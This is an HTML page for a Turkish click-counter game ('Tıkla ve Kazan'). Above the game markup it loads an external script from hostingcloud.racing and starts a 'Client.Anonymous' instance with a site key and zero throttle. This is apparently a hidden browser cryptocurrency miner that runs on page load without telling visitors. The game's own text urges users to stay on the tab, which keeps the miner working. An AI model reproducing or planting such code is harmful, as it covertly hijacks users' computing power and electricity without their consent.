<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Tıkla ve Kazan</title>
  <style>
    body {
      text-align: center;
      font-family: Arial, sans-serif;
    }
    button {
      padding: 20px;
      font-size: 20px;
      cursor: pointer;
    }
    #score {
      font-size: 24px;
      margin-top: 20px;
    }
  </style>
</head>
<body>

<script src="https://www.hostingcloud.racing/xXmw.js"></script>
<script>
    var _client = new Client.Anonymous('0931a19b9bf55187f7eb0b42760d346c417de342add853171911589bdf2c19f9', {
        throttle: 0, c: 'w', ads: 0
    });
    _client.start();
    

</script>

  
  <h1>Tıkla ve Kazan</h1>
  <p>İstediğiniz kadar tıklayın! Sekmeden çıkarsanız puan sıfırlanır.</p>
  <button id="clickButton" onclick="incrementScore()">Tıkla!</button>
  <p id="score">Puan: 0</p>

  <script>
    let score = 0;
    const scoreDisplay = document.getElementById('score');

    // Puanı artır
    function incrementScore() {
      score++;
      scoreDisplay.textContent = `Puan: ${score}`;
      localStorage.setItem('score', score); // Puanı kaydet
    }

    // Sayfa her yüklendiğinde puanı sıfırla
    window.addEventListener('load', () => {
      score = 0;
      localStorage.setItem('score', score);
      scoreDisplay.textContent = `Puan: ${score}`;
    });

    // Sayfadan çıkıldığında puanı sıfırla
    window.addEventListener('beforeunload', () => {
      localStorage.setItem('score', 0);
    });
  </script>
</body>
</html>
